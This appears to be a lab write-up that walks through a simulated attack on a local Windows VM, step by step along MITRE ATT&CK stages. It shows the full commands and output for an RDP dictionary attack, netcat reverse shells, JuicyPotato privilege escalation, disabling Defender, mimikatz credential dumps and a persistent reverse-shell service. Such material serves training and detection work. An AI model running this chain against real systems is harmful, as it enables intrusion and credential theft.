# CASE1

**Attacker :** 192.168.106.141
**Victim :** 192.168.106.142



## STEP1. Initial Access : External Remote Services(T1133)
Using masscan for RDP port scanning and crowbar for Dictionary Attacks to attempt RDP logon.


> Attack Tools : masscan, crowbar
>- masscan - port scanner : https://github.com/robertdavidgraham/masscan
>- Crowbar - Brute forcing tool : https://github.com/galkan/crowbar
>- Support : OpenVPN, Remote Desktop Protocol (RDP) with NLA support, SSH private key authentication, VNC key authentication

### Attacker

![image](https://github.com/user-attachments/assets/f94a5ef2-97ab-4edd-8a95-6144de8257d4)

_[RDP port scan with masscan tool]_


```shell

# masscan 192.168.106.142 -p1025-65535 --rate-1000000

┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# masscan 192.168.106.142 -p30000-30040 --rate-1000000

rate-1000000: empty parameter
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-10 21:32:54 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [41 ports/host]
Discovered open port 30039/tcp on 192.168.106.142

```


![image](https://github.com/user-attachments/assets/d5e815a5-20b5-4d2b-8fbb-6638e739ce00)

_[RDP logon Dictionary Attack with crowbar tool]_


```shell
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# ls
bunny.exe  crowbar  mimikatz.exe  nc64.exe  passlist.txt  userlist.txt
                                                                                                          
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cat userlist.txt 
test
iglootest
testuser
user
admin
administrator
manager
boss
main                                                                                                      
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cat passlist.txt 
qwer1234!
123456
qwer1234
administrator
admin
test
manager
test1234
test1234!
12345678
Administrator                                                                                             
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cd crowbar       
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1/crowbar]
└─# ./crowbar.py -b rdp -s 192.168.106.142/32 -U ../userlist.txt -C ../passlist.txt -p 30039
2025-01-10 17:15:30 START
2025-01-10 17:15:30 Crowbar v0.4.3-dev
2025-01-10 17:15:30 Trying 192.168.106.142:30039
2025-01-10 17:15:36 RDP-SUCCESS : 192.168.106.142:30039 - testuser:qwer1234
2025-01-10 17:15:45 STOP

```

> Attack Tools : xfreerdp
> - xfreerdp: https://linux.die.net/man/1/xfreerdp
> - An X11 Remote Desktop Protocol (RDP) client that is part of the FreeRDP project, enabling RDP access in Linux environments.

![image](https://github.com/user-attachments/assets/238f67a0-ac40-46ec-a21f-eddec0fef27f)

_[Connect RDP to xfreerdp]_



![image](https://github.com/user-attachments/assets/a3174dd7-ab96-48c8-a5a7-16bf96dec33e)
_[The victim's credentials don't match ]_



## STEP2. Execution : Command and Scripting Interpreter(T1059)
Download netcat and JuicyPotato Attack Tool on the attacker’s server, establish reverse shell through netcat to remotely execute cmd commands.


### Attacker
```shell
# cd /home/kali/Attacker_Tool/CASE1
# python3 -m http.server 8080

```
### Victim
![image](https://github.com/user-attachments/assets/2855a712-9824-4c9b-aac6-e0417984f23a)
_[ Download netcat and JuicyPotato(bunny.exe) from Attacker server]_


![image](https://github.com/user-attachments/assets/12db89a9-05b9-451b-bece-0faf15d44333)
_[Detection Windows Defender Security Center]_


### Attacker
![image](https://github.com/user-attachments/assets/951621b2-94ba-4249-acbd-77b61b14c48f)
_[Connect reverse shell to 4445 port using netcat(nc64.exe)]_



![image](https://github.com/user-attachments/assets/ffdb0774-7d1a-4878-9dcd-d420fe71727b)
_[ Verify testuser account’s permissions and run cmd with Administrator privilege Enter testuser password stolen by Dictionary Attack ]_


```shell
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4445
listening on [any] 4445 ...
192.168.106.137: inverse host lookup failed: Unknown host
connect to [192.168.106.138] from (UNKNOWN) [192.168.106.137] 50863
Microsoft Windows [Version 10.0.17134.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\testuser>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\testuser>runas /user:Administrator "cmd"
runas /user:Administrator "cmd"
Enter the password for Administrator: 

C:\Users\testuser>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\testuser> Start-Process cmd -Verb RunAs
Start-Process cmd -Verb RunAs
PS C:\Users\testuser> 

```

![image](https://github.com/user-attachments/assets/44e9409f-e927-4d60-8209-a8c826e4d712)
_[Administrator Permission Console(cmd)]_

![image](https://github.com/user-attachments/assets/ebe13ef1-0115-49c3-876e-23cbc4af3d4e)
_[ Check permission 'SeImpersonatePrivilege' for privilege escalation vulnerabilities ]_



```shell
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4445
listening on [any] 4445 ...
192.168.106.137: inverse host lookup failed: Unknown host
connect to [192.168.106.138] from (UNKNOWN) [192.168.106.137] 50877
Microsoft Windows [Version 10.0.17134.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\testuser>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Users\testuser>

```

> Reference : https://learn.microsoft.com/ko-kr/security-updates/security/20214024
> 
> Using Run as
> You can use Run As in a number of different ways, including the following
> To use Run As to start a command shell that uses the domain administrator account credentials
> 1. Click Start, and then click Run.
> 2. In the Run dialog box, type runas /user:<domain_name>\administrator cmd, where <domain_name> is your domain name, and then click OK.
> 3. When a dialog box appears prompting you to enter a password for the domain_name\administrator account, type the administrator account password and press ENTER.
> 4. A new console window opens, running in administrator context. The console title identifies itself as running as domain_name**\administrator**.




## STEP3. Privilege Escalation : Abuse Elevation Control Mechanism(T1548)
Escalate to SYSTEM privilege using the privilege escalation tool JuicyPotato.


> Attack Tools : JuicyPotato(bunny.exe)

![image](https://github.com/user-attachments/assets/0460906c-9835-4cab-9f32-7ab4386faee0)
_[ Using JuicyPotato(bunny.exe) to steal SYSTEM privilege ]_


```shell
c:\Users\testuser>bunny.exe -l 4445 -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\testuser\nc64.exe -e cmd.exe 192.168.106.138 9999"
bunny.exe -l 4445 -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\testuser\nc64.exe -e cmd.exe 192.168.106.138 9999"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4445
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\testuser>


```


> Windows Privilege Escalation With Potato
> Starting with Hot Potato, the Potato series of tools used to elevate privileges from a Windows service account to NT AUTHORITY/SYSTEM were named with Potato.
> Hot Potato, Rotten Potato, Lonely Potato, Juicy Potato, Rogue Potato, Sweet Potato, Generic Potato, RemotePotato, and RemotePotato.
> - Potatoes - Windows Privilege Escalation : https://jlajara.gitlab.io/Potatoes_Windows_Privesc
> - Rogue Potato : https://github.com/k4sth4/Rogue-Potato
> - Windows Privilege Escalation: Abusing SeImpersonatePrivilege with Juicy Potato : https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/
> - Juicy Potato : https://github.com/ohpe/juicy-potato
> - RemotePotato0 : https://i.blackhat.com/asia-21/Thursday-Handouts/as21-Cocomazzi-The-Rise-of-Potatoes-Privilege-Escalations-in-Windows-Services.pdf


![image](https://github.com/user-attachments/assets/d6cee694-ef11-4d0a-abc7-eda7b35ed143)
_[Running Juicy Potato]_

![image](https://github.com/user-attachments/assets/64c36eba-e598-42d1-b057-ef556a9ca81b)
_[Abusing SeImpersonatePrivilege with Juicy Potato]_


## STEP4. Defense Evasion : Impair Defenses.Disable or Modify Tools(T1562.001)


> Attack Tools : Powershell

![image](https://github.com/user-attachments/assets/31f50c77-46f8-4a74-b85d-56460f96fbdc)
_[ Execute Windows Defender disable command with SYSTEM privilege ]_
```shell
Set-MpPreference -DisableRealtimeMonitoring $true
```

> Reference : https://learn.microsoft.com/ko-kr/defender-endpoint/microsoft-defender-antivirus-on-windows-server


## STEP5. Credential Access : OS Credential Dumping (T1003)

> Attack Tools : mimikatz
![image](https://github.com/user-attachments/assets/525522fb-de81-4554-886e-fa34205744ec)
_[ Download mimikatz from Attacker server ]_


![image](https://github.com/user-attachments/assets/1adef80e-6c54-4cfd-870f-8facd65732e4)
_[ Run mimikatz / Unable to verify password ]_

```shell
┌──(root㉿kali)-[~]
└─# nc -lvp 9999
listening on [any] 9999 ...
192.168.106.137: inverse host lookup failed: Unknown host
connect to [192.168.106.138] from (UNKNOWN) [192.168.106.137] 49881
Microsoft Windows [Version 10.0.17134.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

c:\Users\testuser>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::loginpasswords
ERROR mimikatz_doLocal ; "loginpasswords" command of "sekurlsa" module not found !

Module :        sekurlsa
Full name :     SekurLSA module
Description :   Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
         process  -  Switch (or reinit) to LSASS process  context
        minidump  -  Switch (or reinit) to LSASS minidump context
         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
             pth  -  Pass-the-hash
          krbtgt  -  krbtgt!
     dpapisystem  -  DPAPI_SYSTEM secret
           trust  -  Antisocial
      backupkeys  -  Preferred Backup Master keys
         tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
           dpapi  -  List Cached MasterKeys
         credman  -  List Credentials Manager

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4059104 (00000000:003defe0)
Session           : Interactive from 1
User Name         : testuser
Domain            : DESKTOP-JUE26G8
Logon Server      : DESKTOP-JUE26G8
Logon Time        : 1/8/2025 5:14:31 PM
SID               : S-1-5-21-3531972243-961244172-1039137199-1002
        msv :
         [00000003] Primary
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * NTLM     : 0a640404b5c386ab12092587fe19cd02
         * SHA1     : c1c5df70d2547d43e891bed7c408177580788726
        tspkg :
        wdigest :
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * Password : qwer1234
        kerberos :
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3586658 (00000000:0036ba62)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/8/2025 3:02:07 PM
SID               : S-1-5-90-0-3
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 3586642 (00000000:0036ba52)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/8/2025 3:02:07 PM
SID               : S-1-5-90-0-3
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 3585709 (00000000:0036b6ad)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/8/2025 3:02:07 PM
SID               : S-1-5-96-0-3
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 257060 (00000000:0003ec24)
Session           : Interactive from 1
User Name         : testuser
Domain            : DESKTOP-JUE26G8
Logon Server      : DESKTOP-JUE26G8
Logon Time        : 1/8/2025 2:27:37 PM
SID               : S-1-5-21-3531972243-961244172-1039137199-1002
        msv :
         [00000003] Primary
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * NTLM     : 0a640404b5c386ab12092587fe19cd02
         * SHA1     : c1c5df70d2547d43e891bed7c408177580788726
        tspkg :
        wdigest :
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * Password : qwer1234
        kerberos :
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 257007 (00000000:0003ebef)
Session           : Interactive from 1
User Name         : testuser
Domain            : DESKTOP-JUE26G8
Logon Server      : DESKTOP-JUE26G8
Logon Time        : 1/8/2025 2:27:37 PM
SID               : S-1-5-21-3531972243-961244172-1039137199-1002
        msv :
         [00000003] Primary
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * NTLM     : 0a640404b5c386ab12092587fe19cd02
         * SHA1     : c1c5df70d2547d43e891bed7c408177580788726
        tspkg :
        wdigest :
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * Password : qwer1234
        kerberos :
         * Username : testuser
         * Domain   : DESKTOP-JUE26G8
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/8/2025 2:27:21 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 63276 (00000000:0000f72c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/8/2025 2:27:21 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 63216 (00000000:0000f6f0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/8/2025 2:27:21 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DESKTOP-JUE26G8$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 1/8/2025 2:27:21 PM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : desktop-jue26g8$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 41704 (00000000:0000a2e8)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/8/2025 2:27:20 PM
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 41686 (00000000:0000a2d6)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/8/2025 2:27:20 PM
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 40908 (00000000:00009fcc)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/8/2025 2:27:20 PM
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DESKTOP-JUE26G8$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 1/8/2025 2:27:20 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-JUE26G8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : desktop-jue26g8$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

mimikatz # 


```
![image](https://github.com/user-attachments/assets/ad9b639a-56a1-4f8e-ae9f-05412296ab9f)
![image](https://github.com/user-attachments/assets/e51790d6-af82-48dc-b448-3f99517659fe)

_[ Check user account information and plaintext password ]_


![image](https://github.com/user-attachments/assets/3e94e2f7-538b-48c7-afe9-52289ccf09c1)
_[ Registry change command for plaintext password ]_

```shell
c:\Users\testuser>whoami
whoami
nt authority\system

c:\Users\testuser>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\testuser> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0
PS C:\Users\testuser> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1
PS C:\Users\testuser> 
![image](https://github.com/user-attachments/assets/487d2952-c692-4073-9739-9dea3c35de44)

```

## STEP6. Persistence : Create of Modify System Process(T1543)

> Attack Tools : Powershell

![image](https://github.com/user-attachments/assets/81ecfc38-3c56-4f7a-9470-48a24d6b794a)
_[ Create service(startService) to connect reverse shell with netcat / Service execution permissions to everyone]_


![image](https://github.com/user-attachments/assets/7d9dd43a-00c7-4752-a158-d73a8e9b8cda)
_[ Register service(startService) created in the startup program ]_

![image](https://github.com/user-attachments/assets/b76eb5a4-0dc4-4201-9fef-52f205265662)
_[ Restarting the Victim server ]_


![image](https://github.com/user-attachments/assets/c0030d23-26cd-4e7f-93ed-6a3300b1832b)
_[ Connect reverse shell and SYSTEM privilege on restart ]_


